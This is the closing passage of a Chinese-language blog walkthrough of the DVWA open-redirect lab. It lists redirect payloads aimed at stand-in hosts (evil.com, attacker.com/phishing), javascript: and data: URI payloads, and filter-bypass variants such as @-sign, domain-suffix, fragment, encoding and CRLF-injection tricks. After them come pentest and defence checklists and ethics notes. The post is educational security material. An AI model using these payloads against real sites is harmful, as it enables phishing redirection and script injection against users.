+<h2 id="常用Payload集合"><a href="#常用Payload集合" class="headerlink" title="常用Payload集合"></a>常用Payload集合</h2><h3 id="基础Payload"><a href="#基础Payload" class="headerlink" title="基础Payload"></a>基础Payload</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 外部重定向</span></span><br><span class="line">?<span class="attribute">redirect</span>=https://evil.com</span><br><span class="line">?<span class="attribute">redirect</span>=http://attacker.com/phishing</span><br><span class="line"></span><br><span class="line"><span class="comment"># 协议相对URL</span></span><br><span class="line">?<span class="attribute">redirect</span>=//evil.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># JavaScript协议</span></span><br><span class="line">?<span class="attribute">redirect</span>=javascript:alert(1)</span><br><span class="line">?<span class="attribute">redirect</span>=data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 域名后缀</span></span><br><span class="line">?redirect=http:<span class="regexp">//</span>example.com.evil.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># @符号</span></span><br><span class="line">?redirect=http:<span class="regexp">//</span>example.com@evil.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL参数</span></span><br><span class="line">?redirect=http:<span class="regexp">//</span>evil.com?ref=http:<span class="regexp">//</span>example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fragment</span></span><br><span class="line">?redirect=http:<span class="regexp">//</span>evil.com<span class="comment">#http://example.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反斜杠</span></span><br><span class="line">?redirect=http:<span class="regexp">//</span>example.com\@evil.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL编码</span></span><br><span class="line">?redirect=http:<span class="regexp">//</span>evil.com%<span class="number">3</span>Furl%<span class="number">3</span>Dhttp:<span class="regexp">//</span>example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 换行符</span></span><br><span class="line">?redirect=http:<span class="regexp">//</span>example.com%<span class="number">0</span>D%<span class="number">0</span>ALocation:%<span class="number">20</span>http:<span class="regexp">//</span>evil.com</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>渗透测试清单：</strong></p>
+<ol>
+<li>✅ 测试是否接受外部URL</li>
+<li>✅ 尝试各种协议（http, https, javascript, data）</li>
+<li>✅ 测试@符号绕过</li>
+<li>✅ 测试域名后缀绕过</li>
+<li>✅ 测试URL参数&#x2F;fragment绕过</li>
+<li>✅ 测试解析器差异</li>
+<li>✅ 检查是否有确认页面</li>
+</ol>
+<p><strong>防御清单：</strong></p>
+<ol>
+<li>✅ 使用白名单</li>
+<li>✅ 只允许相对路径（如果可能）</li>
+<li>✅ 验证协议、域名、端口</li>
+<li>✅ 使用ID映射</li>
+<li>✅ 添加确认页面（外部跳转）</li>
+<li>✅ 记录所有重定向</li>
+<li>✅ 实施CSRF防护</li>
+</ol>
+<p><strong>道德准则：</strong></p>
+<ul>
+<li>只在授权环境测试</li>
+<li>不构造真实钓鱼页面</li>
+<li>学习是为了防御开放重定向攻击</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>点这里请我吃个小蛋糕吧～～</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="caixuya WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="caixuya Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>caixuya
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://caixuya.github.io/2025/11/20/Open_HTTP_Redirect_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" title="DVWA - Open HTTP Redirect (开放重定向) 攻防练习详解">http://caixuya.github.io/2025/11/20/Open_HTTP_Redirect_攻防练习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/20/CSP_Bypass_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="prev" title="DVWA - CSP Bypass 攻防练习详解">
+      <i class="fa fa-chevron-left"></i> DVWA - CSP Bypass 攻防练习详解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/11/20/XSS_DOM_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="next" title="DVWA - XSS (DOM) 攻防练习详解">
+      DVWA - XSS (DOM) 攻防练习详解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">漏洞简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%EF%BC%88Open-Redirect%EF%BC%89%EF%BC%9F"><span class="nav-number">2.1.</span> <span class="nav-text">什么是开放重定向（Open Redirect）？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Low-%E9%9A%BE%E5%BA%A6"><span class="nav-number">3.</span> <span class="nav-text">Low 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87"><span class="nav-number">3.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.4.</span> <span class="nav-text">攻击步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E5%9F%BA%E7%A1%80%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB"><span class="nav-number">3.4.1.</span> <span class="nav-text">步骤1：基础重定向攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E6%9E%84%E9%80%A0%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB"><span class="nav-number">3.4.2.</span> <span class="nav-text">步骤2：构造钓鱼攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E4%BD%BF%E7%94%A8JavaScript%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.4.3.</span> <span class="nav-text">步骤3：使用JavaScript协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A44%EF%BC%9A%E7%BB%95%E8%BF%87%E7%AE%80%E5%8D%95%E7%9A%84%E5%8D%8F%E8%AE%AE%E6%A3%80%E6%9F%A5"><span class="nav-number">3.4.4.</span> <span class="nav-text">步骤4：绕过简单的协议检查</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A45%EF%BC%9A%E7%BB%93%E5%90%88XSS%E6%94%BB%E5%87%BB"><span class="nav-number">3.4.5.</span> <span class="nav-text">步骤5：结合XSS攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium-%E9%9A%BE%E5%BA%A6"><span class="nav-number">4.</span> <span class="nav-text">Medium 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-1"><span class="nav-number">4.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-number">4.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4"><span class="nav-number">4.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">4.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E5%9F%9F%E5%90%8D%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="nav-number">4.5.1.</span> <span class="nav-text">方法1：域名后缀绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E4%BD%BF%E7%94%A8-%E7%AC%A6%E5%8F%B7"><span class="nav-number">4.5.2.</span> <span class="nav-text">方法2：使用@符号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9AURL%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">4.5.3.</span> <span class="nav-text">方法3：URL参数绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9AFragment%E7%BB%95%E8%BF%87"><span class="nav-number">4.5.4.</span> <span class="nav-text">方法4：Fragment绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%955%EF%BC%9AURL%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">4.5.5.</span> <span class="nav-text">方法5：URL编码绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High-%E9%9A%BE%E5%BA%A6"><span class="nav-number">5.</span> <span class="nav-text">High 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-2"><span class="nav-number">5.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="nav-number">5.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4-1"><span class="nav-number">5.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E-1"><span class="nav-number">5.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="nav-number">5.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E5%88%A9%E7%94%A8%E8%A7%A3%E6%9E%90%E5%99%A8%E5%B7%AE%E5%BC%82"><span class="nav-number">5.5.1.</span> <span class="nav-text">方法1：利用解析器差异</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%AF%B9URL"><span class="nav-number">5.5.2.</span> <span class="nav-text">方法2：协议相对URL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E7%AB%AF%E5%8F%A3%E7%BB%95%E8%BF%87"><span class="nav-number">5.5.3.</span> <span class="nav-text">方法3：端口绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible-%E9%9A%BE%E5%BA%A6"><span class="nav-number">6.</span> <span class="nav-text">Impossible 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-3"><span class="nav-number">6.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="nav-number">6.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E5%96%84%E7%9A%84%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-number">6.3.</span> <span class="nav-text">完善的防护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%97%A0%E6%B3%95%E6%94%BB%E7%A0%B4%EF%BC%9F"><span class="nav-number">6.4.</span> <span class="nav-text">为什么无法攻破？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">7.</span> <span class="nav-text">防御建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2"><span class="nav-number">7.1.</span> <span class="nav-text">代码层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%BD%BF%E7%94%A8%E7%99%BD%E5%90%8D%E5%8D%95%EF%BC%88%E6%9C%80%E4%BD%B3%E6%96%B9%E6%A1%88%EF%BC%89"><span class="nav-number">7.1.1.</span> <span class="nav-text">1. 使用白名单（最佳方案）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8F%AA%E5%85%81%E8%AE%B8%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="nav-number">7.1.2.</span> <span class="nav-text">2. 只允许相对路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%AA%8C%E8%AF%81%E5%9F%9F%E5%90%8D"><span class="nav-number">7.1.3.</span> <span class="nav-text">3. 验证域名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E4%BD%BF%E7%94%A8%E6%98%A0%E5%B0%84%E8%80%8C%E9%9D%9E%E7%9B%B4%E6%8E%A5URL"><span class="nav-number">7.1.4.</span> <span class="nav-text">4. 使用映射而非直接URL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E6%B7%BB%E5%8A%A0%E7%A1%AE%E8%AE%A4%E9%A1%B5%E9%9D%A2"><span class="nav-number">7.1.5.</span> <span class="nav-text">5. 添加确认页面</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E5%B1%82%E9%9D%A2"><span class="nav-number">7.2.</span> <span class="nav-text">框架层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Laravel%E7%A4%BA%E4%BE%8B"><span class="nav-number">7.2.1.</span> <span class="nav-text">Laravel示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Express-js%E7%A4%BA%E4%BE%8B"><span class="nav-number">7.2.2.</span> <span class="nav-text">Express.js示例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%91%E6%8E%A7%E5%B1%82%E9%9D%A2"><span class="nav-number">7.3.</span> <span class="nav-text">监控层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E8%AE%B0%E5%BD%95%E6%89%80%E6%9C%89%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-number">7.3.1.</span> <span class="nav-text">1. 记录所有重定向</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%A3%80%E6%B5%8B%E5%BC%82%E5%B8%B8%E9%87%8D%E5%AE%9A%E5%90%91%E6%A8%A1%E5%BC%8F"><span class="nav-number">7.3.2.</span> <span class="nav-text">2. 检测异常重定向模式</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E5%AF%B9%E6%AF%94"><span class="nav-number">8.</span> <span class="nav-text">总结对比</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8Payload%E9%9B%86%E5%90%88"><span class="nav-number">9.</span> <span class="nav-text">常用Payload集合</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80Payload"><span class="nav-number">9.1.</span> <span class="nav-text">基础Payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-number">9.2.</span> <span class="nav-text">绕过技巧</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E5%BB%BA%E8%AE%AE"><span class="nav-number">10.</span> <span class="nav-text">实战建议</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="caixuya"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">caixuya</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Caixuya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Caixuya" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:214089030@qq.com" title="E-Mail → mailto:214089030@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备20064368号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">caixuya</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">374k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">5:40</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/undefined/anime.min.js"></script>
+  <script src="/undefined/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
